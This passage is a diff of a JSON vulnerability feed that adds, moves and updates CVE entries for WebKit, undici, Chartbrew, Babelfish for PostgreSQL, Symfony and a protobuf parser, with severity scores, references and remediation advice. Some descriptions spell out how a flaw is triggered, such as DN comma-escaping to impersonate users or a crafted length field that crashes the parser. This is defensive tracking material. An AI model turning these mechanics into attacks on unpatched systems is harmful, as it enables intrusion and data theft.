+      "description": "A use-after-free issue was addressed with improved memory management. This issue is fixed in Safari 27.2, iOS 26.7.2 and iPadOS 26.7.2, iOS 27.2 and iPadOS 27.2, macOS Golden Gate 27.2, visionOS 27.2. Processing maliciously crafted web content may lead to an unexpected Safari crash.",
+      "published": "2026-10-26T21:18:04.020",
+      "updated": "2026-11-06T19:17:34.640",
+      "cvss": 6.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
+      "severity": "medium",
+      "cpes": [
+        "apple:safari",
+        "apple:ipados",
+        "apple:iphone_os",
+        "apple:macos",
+        "apple:visionos"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://support.apple.com/en-us/149227",
+        "https://support.apple.com/en-us/149230",
+        "https://support.apple.com/en-us/149521",
+        "https://support.apple.com/en-us/149526",
+        "https://support.apple.com/en-us/149527"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00421,
+      "epss_percentile": 0.36623,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-11-03T21:00:08.723666+00:00",
+      "matched": [
+        "apple-webkit"
+      ],
+      "match_type": "exact",
+      "tier": 2,
+      "score": 38.1,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 20,
+        "cvss": 13.0,
+        "unauth_network": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-114508",
       "aliases": [
         "GHSA-5wcm-3v2w-8362"
@@ -82732,61 +82925,6 @@
       "ai_analysis": ""
     },
     {
-      "id": "CVE-2026-112693",
-      "aliases": [],
-      "title": "",
-      "description": "A use-after-free issue was addressed with improved memory management. This issue is fixed in Safari 27.2, iOS 26.7.2 and iPadOS 26.7.2, iOS 27.2 and iPadOS 27.2, macOS Golden Gate 27.2, visionOS 27.2. Processing maliciously crafted web content may lead to an unexpected Safari crash.",
-      "published": "2026-10-26T21:18:04.020",
-      "updated": "2026-11-03T16:26:03.450",
-      "cvss": 6.5,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
-      "severity": "medium",
-      "cpes": [
-        "apple:safari",
-        "apple:ipados",
-        "apple:iphone_os",
-        "apple:macos",
-        "apple:visionos"
-      ],
-      "packages": [],
-      "vendor_products": [],
-      "references": [
-        "https://support.apple.com/en-us/149227",
-        "https://support.apple.com/en-us/149230",
-        "https://support.apple.com/en-us/149521",
-        "https://support.apple.com/en-us/149526",
-        "https://support.apple.com/en-us/149527"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": 0.00188,
-      "epss_percentile": 0.08497,
-      "x_mentions": null,
-      "sources": [
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-11-03T21:00:08.723666+00:00",
-      "matched": [
-        "apple-webkit"
-      ],
-      "match_type": "exact",
-      "tier": 2,
-      "score": 38.0,
-      "level": "medium",
-      "score_breakdown": {
-        "popularity": 20,
-        "cvss": 13.0,
-        "unauth_network": 5,
-        "epss": 0.0
-      },
-      "ai_analysis": ""
-    },
-    {
       "id": "CVE-2026-111769",
       "aliases": [],
       "title": "Model Context Protocol TypeScript SDK: HTTP client transports and OAuth requests followed cross-origin redirects and re-sent custom headers and request bodies",
@@ -82946,54 +83084,6 @@
         "cvss": 13.0,
         "unauth_network": 5,
         "epss": 0.0
-      },
-      "ai_analysis": ""
-    },
-    {
-      "id": "CVE-2026-120474",
-      "aliases": [],
-      "title": "undici vulnerable to cross-user cache disclosure via same-origin redirect",
-      "description": "undici is an HTTP client for Node.js. In versions 7.0.0 through 7.30.1 and 8.0.0 through 8.12.3, when the redirect interceptor and a shared response cache are used together, an authenticated request that is redirected to a same-origin target has the final response stored under the original request's cache key. That key omits the credential and carries no Vary header, so a later anonymous or different user can be served the first user's private response body. This results in cross-user disclosure of cached private responses. The issue is fixed in undici 7.30.2 and 8.12.4, and users should upgrade to one of those versions or later.",
-      "published": "2026-11-06T09:57:46.664Z",
-      "updated": "2026-11-06T10:16:36.913",
-      "cvss": 6.5,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N",
-      "severity": "medium",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [
-        "undici undici"
-      ],
-      "references": [
-        "https://github.com/nodejs/undici/security/advisories/GHSA-7xg3-fphp-28hg",
-        "https://cna.openjsf.org/security-advisories.html"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": null,
-      "epss_percentile": null,
-      "x_mentions": null,
-      "sources": [
-        "cve.org",
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-11-06T11:31:43.774082+00:00",
-      "matched": [
-        "undici"
-      ],
-      "match_type": "exact",
-      "tier": 2,
-      "score": 38.0,
-      "level": "medium",
-      "score_breakdown": {
-        "popularity": 20,
-        "cvss": 13.0,
-        "unauth_network": 5
       },
       "ai_analysis": ""
     },
@@ -84149,6 +84239,55 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-86005",
+      "aliases": [],
+      "title": "Chartbrew: Unauthenticated BullMQ Admin Dashboard Exposure in Chartbrew",
+      "description": "Chartbrew is an open-source web application that can connect directly to databases and APIs and use the data to create charts. Prior to 5.2.3, the administrative BullMQ dashboard was mounted without an authentication check. The vulnerable surface is the Bull Board/BullMQ administration dashboard at /apps/queues. A remote unauthenticated attacker reaches /apps/queues on a Chartbrew instance where Redis and BullMQ are enabled and a reverse proxy does not independently block the route. The dashboard trusted network reachability as authorization and exposed its queue-management interface directly. Redis and BullMQ must be enabled and the route must be reachable. Available actions depend on the installed Bull Board version and queue state, while confidentiality depends on job payload and log contents. An unauthenticated user can inspect exposed job payloads and logs and, when enabled by the installed version and queue state, retry or delete jobs or otherwise alter queue processing, affecting confidentiality, integrity, or availability. This issue is fixed in version 5.2.3.",
+      "published": "2026-11-06T21:10:41.526Z",
+      "updated": "2026-11-06T21:17:12.253",
+      "cvss": 9.3,
+      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+      "severity": "critical",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [
+        "chartbrew chartbrew"
+      ],
+      "references": [
+        "https://github.com/chartbrew/chartbrew/security/advisories/GHSA-w8g3-j8rf-qc5j",
+        "https://github.com/chartbrew/chartbrew/commit/91873ce25d2b76d7bb6de7c61f372d03d56cc4aa",
+        "https://github.com/chartbrew/chartbrew/releases/tag/v5.2.3"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "cve.org",
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-11-06T23:31:58.291375+00:00",
+      "matched": [
+        "redis"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 37.6,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 18.6,
+        "unauth_network": 5
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-114509",
       "aliases": [],
       "title": "",
@@ -85021,150 +85160,6 @@
         "cvss": 10.8,
         "unauth_network": 5,
         "epss": 0.0
-      },
-      "ai_analysis": ""
-    },
-    {
-      "id": "CVE-2026-120222",
-      "aliases": [],
-      "title": "undici vulnerable to Denial of Service via unhandled exception in cache-interceptor response replay",
-      "description": "undici is an HTTP client for Node.js. In versions 7.0.0 through 7.30.1 and 8.0.0 through 8.12.3, when the cache interceptor is composed with a downstream handler that throws during response processing (such as the built-in dump interceptor exceeding its maxSize, or the decompress interceptor rejecting more than five Content-Encoding values), a throw raised asynchronously while a cached response is replayed escapes as an uncaught exception or unhandled promise rejection and terminates the Node.js process. A malicious or compromised HTTP server can crash any such client by serving a cacheable response that triggers the throw on replay, including on a 304 revalidation of a stale entry, so the impact is availability only. The issue is fixed in undici 7.30.2 and 8.12.4, and users should upgrade to one of those versions or later. As a workaround, avoid composing the cache interceptor with a response handler that throws during response processing until upgrading.",
-      "published": "2026-11-06T10:00:50.635Z",
-      "updated": "2026-11-06T10:16:36.497",
-      "cvss": 5.9,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
-      "severity": "medium",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [
-        "undici undici"
-      ],
-      "references": [
-        "https://github.com/nodejs/undici/security/advisories/GHSA-3g9m-rv3r-w5w2",
-        "https://cna.openjsf.org/security-advisories.html"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": null,
-      "epss_percentile": null,
-      "x_mentions": null,
-      "sources": [
-        "cve.org",
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-11-06T11:31:43.774082+00:00",
-      "matched": [
-        "undici"
-      ],
-      "match_type": "exact",
-      "tier": 2,
-      "score": 36.8,
-      "level": "medium",
-      "score_breakdown": {
-        "popularity": 20,
-        "cvss": 11.8,
-        "unauth_network": 5
-      },
-      "ai_analysis": ""
-    },
-    {
-      "id": "CVE-2026-120415",
-      "aliases": [],
-      "title": "undici vulnerable to cross-origin credential disclosure via array-of-tuples headers bypassing redirect stripping",
-      "description": "undici is an HTTP client for Node.js. In versions 7.0.0 through 7.30.1 and 8.0.0 through 8.12.3, the redirect interceptor strips sensitive headers such as Authorization, Cookie, Proxy-Authorization, and Host when a request is redirected to a different origin, but when request headers are supplied as an array of name and value tuples (a valid documented input, for example from Object.entries), the redirect handler misreads them as a flat list so the header names never match and the sensitive headers are not removed. If a header-normalizing interceptor such as cache or deduplicate is composed outside the redirect interceptor, it then serializes the retained headers onto the cross-origin request, disclosing the caller's origin-bound credentials to the unrelated redirect destination. This is a representation-dependent bypass of the cross-origin header stripping added in CVE-2024-30260. The issue is fixed in undici 7.30.2 and 8.12.4, and users should upgrade to one of those versions or later. As a workaround, supply request headers as a plain object or a flat name and value array rather than an array of tuples, or compose the redirect interceptor outside the normalizing interceptor.",
-      "published": "2026-11-06T10:10:48.653Z",
-      "updated": "2026-11-06T10:16:36.633",
-      "cvss": 5.9,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
-      "severity": "medium",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [
-        "undici undici"
-      ],
-      "references": [
-        "https://github.com/nodejs/undici/security/advisories/GHSA-9v6h-8rgp-m69f",
-        "https://cna.openjsf.org/security-advisories.html"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": null,
-      "epss_percentile": null,
-      "x_mentions": null,
-      "sources": [
-        "cve.org",
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-11-06T11:31:43.774082+00:00",
-      "matched": [
-        "undici"
-      ],
-      "match_type": "exact",
-      "tier": 2,
-      "score": 36.8,
-      "level": "medium",
-      "score_breakdown": {
-        "popularity": 20,
-        "cvss": 11.8,
-        "unauth_network": 5
-      },
-      "ai_analysis": ""
-    },
-    {
-      "id": "CVE-2026-120423",
-      "aliases": [],
-      "title": "undici vulnerable to Subresource Integrity bypass via whitespace in integrity metadata",
-      "description": "undici is an HTTP client for Node.js. In versions 7.15.0 through 7.30.1 and 8.0.0 through 8.12.3, fetch verifies Subresource Integrity metadata by splitting the integrity string on a single space, but the SRI grammar separates metadata by ASCII whitespace, which also includes the horizontal tab. An integrity value whose digest is preceded by a tab or other ASCII whitespace is parsed as a single unrecognized token and skipped, and when no recognized algorithm remains undici treats the integrity list as empty and accepts the response, so a server returning a body different from the pinned digest passes the check. An application that pins a response with a valid but whitespace-surrounded SRI value receives attacker-controlled bytes with no integrity error, and the attacker needs only to control the response body, not the integrity metadata. The issue is fixed in undici 7.30.2 and 8.12.4, and users should upgrade to one of those versions or later. As a workaround, supply SRI integrity metadata without surrounding whitespace, using a single space to separate multiple digests.",
-      "published": "2026-11-06T10:08:32.545Z",
-      "updated": "2026-11-06T10:16:36.780",
-      "cvss": 5.9,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N",
-      "severity": "medium",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [
-        "undici undici"
-      ],
-      "references": [
-        "https://github.com/nodejs/undici/security/advisories/GHSA-r4pc-4jcp-7pqc",
-        "https://cna.openjsf.org/security-advisories.html"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": null,
-      "epss_percentile": null,
-      "x_mentions": null,
-      "sources": [
-        "cve.org",
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-11-06T11:31:43.774082+00:00",
-      "matched": [
-        "undici"
-      ],
-      "match_type": "exact",
-      "tier": 2,
-      "score": 36.8,
-      "level": "medium",
-      "score_breakdown": {
-        "popularity": 20,
-        "cvss": 11.8,
-        "unauth_network": 5
       },
       "ai_analysis": ""
     },
@@ -89188,7 +89183,7 @@
       "title": "",
       "description": "Authentication bypass by spoofing in X509Authenticator and X509AuthenticationListener of Symfony versions prior to 5.4.56, 6.x prior to 6.4.50, 7.x prior to 7.4.23, and 8.x prior to 8.1.11 allows an attacker holding a certificate from the application's trusted CA who can influence the CN to authenticate as an arbitrary user of the application, including a privileged one, following an incomplete fix for CVE-2026-45063.\nX509Authenticator extracts the user identifier from the Subject DN (Distinguished Name) that the web server passes in $_SERVER['SSL_CLIENT_S_DN']. The fix for CVE-2026-45063 anchored that extraction to an RDN (Relative Distinguished Name) boundary, but the regular expression used was not escape-aware. The expression runs against an already serialized DN, so it cannot tell an RDN separator from a separator character that occurs inside a value. Under RFC 2253, used by Apache and by nginx's $ssl_client_s_dn, a comma inside a value is escaped as \\, and the expression reads it as a separator regardless. RFC 2253 also does not treat / as a separator, so it leaves it bare inside a value, while the expression treats every / as one. The legacy X509_NAME_oneline() format, used by Apache's LegacyDNStringFormat and by nginx's $ssl_client_s_dn_legacy, is the mirror image: it escapes / as \\/ and leaves , bare. In that format, a certificate with no emailAddress attribute, or whose poisoned CN precedes it, authenticates as the smuggled address.\n\n\n\n\n\nTo cover both RFC 2253 and the legacy X509_NAME_oneline() format, X509Authenticator and X509AuthenticationListener now split the DN into RDNs before looking for the attribute, instead of matching the attribute against the serialized string. They select the separator from the serialization, split on unescaped occurrences of that separator only, unescape each RDN afterwards with the rules of its format, and require the attribute to span a whole RDN. The accepted value grammar is unchanged.\n\n\n\n\nApplications that pass a per-attribute user key (such as SSL_CLIENT_S_DN_Email) and deployments whose CA generates or validates the subject are not affected by this vulnerability.",
       "published": "2026-11-04T13:17:25.890",
-      "updated": "2026-11-05T19:17:14.050",
+      "updated": "2026-11-06T21:40:43.450",
       "cvss": 7.7,
       "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "high",
@@ -89206,7 +89201,7 @@
       "ransomware": false,
       "ssvc_exploitation": "",
       "epss": 0.0027,
-      "epss_percentile": 0.1937,
+      "epss_percentile": 0.19355,
       "x_mentions": null,
       "sources": [
         "nvd"
@@ -92765,6 +92760,56 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-119924",
+      "aliases": [],
+      "title": "Out-of-Bounds Read in Babelfish for PostgreSQL TDS RPC Procedure-Name Parser",
+      "description": "An out-of-bounds read in the TDS RPC procedure-name parser in the Babelfish for PostgreSQL extension versions 1.0-1.5, 2.1-2.15, 3.1-3.12, 4.0-4.8, 5.1-5.4 and in Amazon Aurora PostgreSQL with Babelfish might allow remote authenticated users to read adjacent process memory or cause a denial of service via a malformed TDS RPC request to the TDS port (default 1433).\n\n\n\nTo remediate this issue, we recommend users upgrade to Babelfish for PostgreSQL extension versions 4.10, 5.6, 6.1 or later. As a workaround, restrict network access to the TDS port (default 1433). Customers using Amazon Aurora PostgreSQL with Babelfish should upgrade their cluster to Aurora PostgreSQL 13.9.16 (1.5.5), 13.23.3 (1.17.2), 14.6.16 (2.3.5), 14.17.8 (2.12.4), 14.18.6 (2.13.3), 14.19.5 (2.14.2), 14.20.5 (2.15.2), 14.22.3 (2.16.1), 14.23.1 (2.17.0), 15.10.8 (3.8.4), 15.12.8 (3.9.4), 15.13.6 (3.10.3), 15.14.5 (3.11.2), 15.15.5 (3.12.2), 15.17.3 (3.13.1), 15.18.1 (3.14.0), 16.8.8 (4.5.5), 16.9.6 (4.6.3), 16.10.5 (4.7.2), 16.11.5 (4.8.2), 16.13.3 (4.9.1), 16.14.1 (4.10.0), 17.4.8 (5.1.4), 17.5.6 (5.2.3), 17.6.5 (5.3.2), 17.7.5 (5.4.2), 17.9.3 (5.5.1), 17.10.1 (5.6.0), 18.3.4 (6.0.2), 18.4.1 (6.1.0) or later, and apply any pending maintenance to ensure they are on the latest patch.",
+      "published": "2026-11-06T18:38:50.951Z",
+      "updated": "2026-11-06T21:17:06.577",
+      "cvss": 7.2,
+      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:H/SC:N/SI:N/SA:N",
+      "severity": "high",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [
+        "AWS babelfish-for-postgresql",
+        "Amazon Amazon Aurora PostgreSQL with Babelfish"
+      ],
+      "references": [
+        "https://github.com/babelfish-for-postgresql/babelfish-for-postgresql/releases/tag/BABEL_4_10_0__PG_16_14",
+        "https://github.com/babelfish-for-postgresql/babelfish-for-postgresql/releases/tag/BABEL_5_6_0__PG_17_10",
+        "https://github.com/babelfish-for-postgresql/babelfish-for-postgresql/releases/tag/BABEL_6_1_0__PG_18_4",
+        "https://aws.amazon.com/security/security-bulletins/2026-166-aws/"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "none",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "cve.org",
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-11-06T23:31:58.291375+00:00",
+      "matched": [
+        "postgresql"
+      ],
+      "match_type": "exact",
+      "tier": 2,
+      "score": 34.4,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 20,
+        "cvss": 14.4
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-120065",
       "aliases": [],
       "title": "psqlODBC does not escape a server-supplied column name in its updatable-cursor queries",
@@ -93011,7 +93056,7 @@
       "title": "",
       "description": "ProtobufParser._readStringKey() reads the length prefix of a protobuf map entry's string key into an attacker-controlled int and then checks (_inputPtr + len) <= _inputEnd using signed arithmetic. For values near Integer.MAX_VALUE the addition overflows to a negative value and the check passes even when the input contains no key data. The parser then calls _finishShortText(len), which expands the text buffer to the declared length via TextBuffer.expandCurrentSegment and Arrays.copyOf, throwing OutOfMemoryError: Requested array size exceeds VM limit.\n\n\n\nAn 8-byte malformed message containing a map entry with a declared key length of 0x7FFFFFFF is sufficient. Configured StreamReadConstraints, including maxStringLength, maxNameLength, maxDocumentLength and maxNestingDepth, do not prevent the failure. Applications running with -XX:+ExitOnOutOfMemoryError terminate the JVM.\n\n\n\nThis is the same integer-overflow pattern addressed for other call sites in the remediation associated with CVE-2026-104016 and CVE-2026-104017; the map-key call site was corrected on the 3.x branches only, leaving the corresponding 2.x branches unguarded. Release lines 2.18, 2.19 and 2.20 do not contain _readStringKey() and are not affected by this vector. No privileges or user interaction beyond the ability to submit data for parsing are required. The 3.0 release line and 3.1.0-3.1.5 / 3.2.0-3.2.1 do not contain _readStringKey() and are therefore not affected; the method first appears in 3.1.6 and 3.2.2, mirroring its introduction at 2.21.6 on the 2.x side.",
       "published": "2026-10-28T01:16:55.017",
-      "updated": "2026-10-28T15:24:56.033",
+      "updated": "2026-11-06T19:17:08.147",
       "cvss": 7.5,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
       "severity": "high",
@@ -93027,7 +93072,7 @@
       "ransomware": false,
       "ssvc_exploitation": "",
       "epss": 0.00387,
-      "epss_percentile": 0.32735,
+      "epss_percentile": 0.33043,
       "x_mentions": null,
       "sources": [
         "nvd"
@@ -94284,6 +94329,51 @@
         "popularity": 14.0,
         "cvss": 19.8,
         "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-116592",
+      "aliases": [],
+      "title": "",
+      "description": "undici is an HTTP client for Node.js. In versions 7.30.1 and 8.12.2 through 8.12.3, when an originless Agent composes the redirect and shared cache interceptors, undici decides whether to store the final response under the original request key by inspecting only the final redirect hop, which bypasses the earlier fix for CVE-2026-109829 that compared only the initial and final origins. A redirect that bounces through an untrusted origin and returns to the trusted origin is still cached under the trusted key, an intermediate hop's Vary is dropped so a response that varies on Authorization or Cookie can be served to a different user, and an intermediate hop's no-cache or default-uncacheable status is ignored so a non-storable redirect is laundered into a cacheable entry. An attacker who controls a redirect target from a trusted URL can poison the cached entry for that URL or have a private, per-user response served to a later caller. The issue is fixed in undici 7.30.2 and 8.12.4, and users should upgrade to one of those versions or later. As a workaround, compose the interceptors as cache then redirect, use per-origin dispatchers and cache stores, or disable shared caching on redirect-capable requests.",
+      "published": "2026-11-06T10:16:36.313",
+      "updated": "2026-11-06T20:38:53.570",
+      "cvss": 7.4,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+      "severity": "high",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://cna.openjsf.org/security-advisories.html",
+        "https://github.com/nodejs/undici/security/advisories/GHSA-mqg3-3v4r-cm32"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-11-06T11:31:43.774082+00:00",
+      "matched": [
+        "undici"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 33.8,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 14.8,
+        "unauth_network": 5
       },
       "ai_analysis": ""
     },
@@ -96796,6 +96886,52 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-120474",
+      "aliases": [],
+      "title": "",
+      "description": "undici is an HTTP client for Node.js. In versions 7.0.0 through 7.30.1 and 8.0.0 through 8.12.3, when the redirect interceptor and a shared response cache are used together, an authenticated request that is redirected to a same-origin target has the final response stored under the original request's cache key. That key omits the credential and carries no Vary header, so a later anonymous or different user can be served the first user's private response body. This results in cross-user disclosure of cached private responses. The issue is fixed in undici 7.30.2 and 8.12.4, and users should upgrade to one of those versions or later.",
+      "published": "2026-11-06T10:16:36.913",
+      "updated": "2026-11-06T20:38:53.570",
+      "cvss": 6.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N",
+      "severity": "medium",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://cna.openjsf.org/security-advisories.html",
+        "https://github.com/nodejs/undici/security/advisories/GHSA-7xg3-fphp-28hg"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00288,
+      "epss_percentile": 0.21414,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-11-06T11:31:43.774082+00:00",
+      "matched": [
+        "undici"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 32.0,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 13.0,
+        "unauth_network": 5,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-114623",
       "aliases": [],
       "title": "",
@@ -97766,9 +97902,9 @@
       "id": "CVE-2026-119922",
       "aliases": [],
       "title": "",
-      "description": "Improper access control in the Babelfish for PostgreSQL extension versions 1.2-1.5, 2.1-2.15, 3.1-3.12, 4.0-4.8, 5.1-5.4 may allow remote authenticated users to elevate their privileges. To remediate this issue, we recommend you upgrade to Babelfish for PostgreSQL extension versions 4.10, 5.6, 6.1 or later.",
+      "description": "Improper access control in the Babelfish for PostgreSQL extension versions 1.2-1.5, 2.1-2.15, 3.1-3.12, 4.0-4.8, 5.1-5.4 and in Amazon Aurora PostgreSQL with Babelfish may allow remote authenticated users to elevate their privileges. To remediate this issue, we recommend users upgrade to Babelfish for PostgreSQL extension versions 4.10, 5.6, 6.1 or later. Customers using Amazon Aurora PostgreSQL with Babelfish should upgrade their cluster to Aurora PostgreSQL 13.9.16 (1.5.5), 13.23.3 (1.17.2), 14.6.16 (2.3.5), 14.17.8 (2.12.4), 14.18.6 (2.13.3), 14.19.5 (2.14.2), 14.20.5 (2.15.2), 14.22.3 (2.16.1), 14.23.1 (2.17.0), 15.10.8 (3.8.4), 15.12.8 (3.9.4), 15.13.6 (3.10.3), 15.14.5 (3.11.2), 15.15.5 (3.12.2), 15.17.3 (3.13.1), 15.18.1 (3.14.0), 16.8.8 (4.5.5), 16.9.6 (4.6.3), 16.10.5 (4.7.2), 16.11.5 (4.8.2), 16.13.3 (4.9.1), 16.14.1 (4.10.0), 17.4.8 (5.1.4), 17.5.6 (5.2.3), 17.6.5 (5.3.2), 17.7.5 (5.4.2), 17.9.3 (5.5.1), 17.10.1 (5.6.0), 18.3.4 (6.0.2), 18.4.1 (6.1.0) or later, and apply any pending maintenance to ensure they are on the latest patch.",
       "published": "2026-11-03T19:17:57.020",
-      "updated": "2026-11-04T14:10:09.713",
+      "updated": "2026-11-06T19:17:39.113",
       "cvss": 8.7,
       "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "high",
@@ -97777,8 +97913,8 @@
       "vendor_products": [],
       "references": [
         "https://aws.amazon.com/security/security-bulletins/2026-165-aws/",
-        "https://github.com/babelfish-for-postgresql/babelfish-for-postgresql/releases#release-BABEL_4_10_0__PG_16_14",
-        "https://github.com/babelfish-for-postgresql/babelfish-for-postgresql/releases#release-BABEL_5_6_0__PG_17_10",
+        "https://github.com/babelfish-for-postgresql/babelfish-for-postgresql/releases/tag/BABEL_4_10_0__PG_16_14",
+        "https://github.com/babelfish-for-postgresql/babelfish-for-postgresql/releases/tag/BABEL_5_6_0__PG_17_10",
         "https://github.com/babelfish-for-postgresql/babelfish-for-postgresql/releases/tag/BABEL_6_1_0__PG_18_4",
         "https://github.com/babelfish-for-postgresql/babelfish_extensions/security/advisories/GHSA-fv9p-9rr9-fm35"
       ],
@@ -97788,7 +97924,7 @@
       "ransomware": false,
       "ssvc_exploitation": "",
       "epss": 0.00549,
-      "epss_percentile": 0.46069,
+      "epss_percentile": 0.46125,
       "x_mentions": null,
       "sources": [
         "nvd"
@@ -98496,12 +98632,147 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-120222",
+      "aliases": [],
+      "title": "",
+      "description": "undici is an HTTP client for Node.js. In versions 7.0.0 through 7.30.1 and 8.0.0 through 8.12.3, when the cache interceptor is composed with a downstream handler that throws during response processing (such as the built-in dump interceptor exceeding its maxSize, or the decompress interceptor rejecting more than five Content-Encoding values), a throw raised asynchronously while a cached response is replayed escapes as an uncaught exception or unhandled promise rejection and terminates the Node.js process. A malicious or compromised HTTP server can crash any such client by serving a cacheable response that triggers the throw on replay, including on a 304 revalidation of a stale entry, so the impact is availability only. The issue is fixed in undici 7.30.2 and 8.12.4, and users should upgrade to one of those versions or later. As a workaround, avoid composing the cache interceptor with a response handler that throws during response processing until upgrading.",
+      "published": "2026-11-06T10:16:36.497",
+      "updated": "2026-11-06T20:38:53.570",
+      "cvss": 5.9,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "severity": "medium",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://cna.openjsf.org/security-advisories.html",
+        "https://github.com/nodejs/undici/security/advisories/GHSA-3g9m-rv3r-w5w2"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
